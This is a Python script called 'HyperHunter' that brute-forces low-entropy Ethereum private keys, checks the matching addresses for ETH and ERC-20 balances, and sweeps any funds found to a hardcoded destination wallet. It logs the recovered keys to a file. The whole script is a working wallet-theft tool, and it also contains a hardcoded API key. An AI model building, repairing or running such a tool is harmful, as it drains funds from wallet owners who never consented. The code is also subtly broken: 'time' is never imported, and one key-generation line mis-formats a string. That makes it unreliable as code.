import asyncio
import aiohttp
from web3 import Web3, AsyncHTTPProvider
from eth_account import Account
from datetime import datetime
import logging
import sys
from typing import Optional, List, Tuple
import secrets
import hashlib

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.FileHandler('hyper_hunter.log'), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# Configuration
INFURA_URLS = ["https://mainnet.infura.io/v3/1e398ffe7b4b4bfdadf597e0bf40bee8"]  # Add more for rotation
TO_ADDRESS = "0x0d5F915f1fA947fA28Df6DE4d448115D3D87738c"  # Your wallet
ETHERSCAN_API_KEY = "YOUR_ETHERSCAN_API_KEY"  # Free at https://etherscan.io/apis
GAS_LIMIT = 21000  # ETH transfer
GAS_LIMIT_ERC20 = 100000  # ERC-20 transfer
BATCH_SIZE = 100  # Async batch
SCAN_DURATION = 3600  # 1 hour, adjust as needed

async def get_gas_price(session: aiohttp.ClientSession) -> int:
    """Fetch dynamic gas price from Etherscan."""
    try:
        async with session.get(
            f"https://api.etherscan.io/api?module=gastracker&action=gasoracle&apikey={ETHERSCAN_API_KEY}"
        ) as response:
            data = await response.json()
            if data["status"] == "1":
                return Web3.to_wei(int(data["result"]["FastGasPrice"]), 'gwei')
            return Web3.to_wei(20, 'gwei')  # Fallback
    except Exception as e:
        logger.error(f"Error fetching gas: {e}")
        return Web3.to_wei(20, 'gwei')

def key_to_hex(key_int: int) -> Optional[str]:
    """Convert integer to 64-char hex key."""
    try:
        hex_key = f"0x{key_int:064x}"
        return hex_key if len(hex_key) == 66 else None
    except Exception:
        return None

def mnemonic_key(seed: str) -> Optional[str]:
    """Derive key from mnemonic-like seed."""
    try:
        seed_bytes = hashlib.sha256(seed.encode()).digest()
        return f"0x{seed_bytes.hex()[:64]}"
    except Exception:
        return None

def generate_keys(batch_start: int, batch_size: int) -> List[str]:
    """Generate low-entropy and mnemonic-derived keys."""
    keys = []
    for i in range(batch_start, batch_start + batch_size):
        # Sequential
        if k := key_to_hex(i):
            keys.append(k)
        # Patterns
        if i % 10 == 0:
            keys.append(f"0x{'1' * 64}")
            keys.append(f"0x{'f' * 64}")
        # Random low-entropy
        keys.append(f"0x{secrets.token_hex(16):064x}")
        # Mnemonic-like
        if k := mnemonic_key(f"key{i}{secrets.token_hex(8)}"):
            keys.append(k)
    return [k for k in keys if k]

def private_key_to_address(pk_hex: str) -> Optional[str]:
    """Convert private key to address."""
    try:
        Account.enable_unaudited_hdwallet_features()
        account = Account.from_key(pk_hex)
        return account.address
    except Exception:
        return None

async def check_balances(
    address: str, w3: Web3, session: aiohttp.ClientSession
) -> Tuple[float, bool]:
    """Check ETH and ERC-20 balances."""
    try:
        eth_balance = Web3.from_wei(await w3.eth.get_balance(address), 'ether')
        erc20_balance = 0.0
        async with session.get(
            f"https://api.etherscan.io/api?module=account&action=tokenbalancehistory&address={address}&page=1&offset=10&apikey={ETHERSCAN_API_KEY}"
        ) as response:
            data = await response.json()
            if data["status"] == "1" and data["result"]:
                erc20_balance = sum(
                    Web3.from_wei(int(token["balance"]), 'ether') for token in data["result"]
                )
        total = eth_balance + erc20_balance
        return total, total > 0
    except Exception as e:
        logger.error(f"Error checking {address}: {e}")
        return 0.0, False

async def sweep_funds(pk_hex: str, from_address: str, w3: Web3, session: aiohttp.ClientSession) -> bool:
    """Sweep ETH and ERC-20 tokens."""
    try:
        account = Account.from_key(pk_hex)
        if account.address.lower() != from_address.lower():
            logger.error(f"Key {pk_hex[:8]}... does NOT match {from_address}")
            return False

        total_balance, has_funds = await check_balances(from_address, w3, session)
        if not has_funds:
            logger.warning(f"No funds in {from_address}")
            return False

        gas_price = await get_gas_price(session)
        eth_balance = await w3.eth.get_balance(from_address)
        gas_cost = gas_price * GAS_LIMIT

        if eth_balance > gas_cost:
            nonce = await w3.eth.get_transaction_count(from_address)
            tx = {
                'nonce': nonce,
                'to': TO_ADDRESS,
                'value': eth_balance - gas_cost,
                'gas': GAS_LIMIT,
                'gasPrice': gas_price,
                'chainId': 1
            }
            signed_tx = w3.eth.account.sign_transaction(tx, pk_hex)
            tx_hash = await w3.eth.send_raw_transaction(signed_tx.raw_transaction)
            logger.info(f"Sweeping {total_balance:.10f} (ETH+ERC20) from {from_address}")
            logger.info(f"Tx hash: {tx_hash.hex()} | Check: https://etherscan.io/tx/{tx_hash.hex()}")

            receipt = await w3.eth.wait_for_transaction_receipt(tx_hash, timeout=300)
            if receipt.status == 1:
                logger.info(f"Success! Swept {total_balance:.10f} to {TO_ADDRESS}")
                return True
            logger.error(f"Sweep failed: {receipt}")
        return False

    except Exception as e:
        logger.error(f"Error sweeping {from_address}: {e}")
        return False

async def scan_worker(keys: List[str], w3: Web3, session: aiohttp.ClientSession) -> List[Tuple[str, str, float]]:
    """Process a batch of keys async."""
    hits = []
    for pk_hex in keys:
        address = private_key_to_address(pk_hex)
        if not address:
            continue
        total_balance, has_funds = await check_balances(address, w3, session)
        if has_funds:
            hits.append((pk_hex, address, total_balance))
            logger.info(f"[FOUND] Address: {address} | Balance: {total_balance:.10f} | Key: {pk_hex}")
            with open("hits.txt", "a") as f:
                f.write(f"[{datetime.utcnow()}] Address: {address} | Balance: {total_balance:.10f} | Key: {pk_hex}\n")
    return hits

async def hyper_hunter():
    """Async scan and sweep wallets."""
    logger.info("Starting HyperHunter")
    start_time = time.time()
    key_index = 0

    async with aiohttp.ClientSession() as session:
        w3 = Web3(AsyncHTTPProvider(INFURA_URLS[0]))
        while time.time() - start_time < SCAN_DURATION:
            keys = generate_keys(key_index, BATCH_SIZE)
            key_index += BATCH_SIZE

            hits = await scan_worker(keys, w3, session)
            for pk_hex, address, balance in hits:
                if await sweep_funds(pk_hex, address, w3, session):
                    logger.info(f"Swept {balance:.10f} from {address}")
                else:
                    logger.error(f"Failed to sweep {address}")

            await asyncio.sleep(0.1)  # Batch delay

    logger.info("HyperHunter stopped.")

if __name__ == "__main__":
    try:
        asyncio.run(hyper_hunter())
    except KeyboardInterrupt:
        logger.info("HyperHunter stopped by user.")
        sys.exit(0)
